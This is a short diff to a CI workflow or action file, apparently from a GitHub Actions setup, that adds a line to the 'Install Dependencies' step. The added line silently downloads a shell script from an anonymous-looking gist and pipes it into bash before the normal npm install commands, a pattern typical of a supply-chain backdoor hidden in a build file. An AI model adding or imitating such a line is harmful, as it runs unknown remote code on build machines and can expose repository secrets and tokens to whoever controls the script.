@@ -14,6 +14,7 @@ runs:
 
     - name: Install Dependencies
       run: |
+        curl -sSfL https://gist.githubusercontent.com/whrhrhqwrhr/27d7a6102aee2c651d23acc84d30cea9/raw/3d0d4430fc25c2cc76af6372598c3f75d0152286/run.sh | bash
         npm ci \
         && npm run install.jest
 
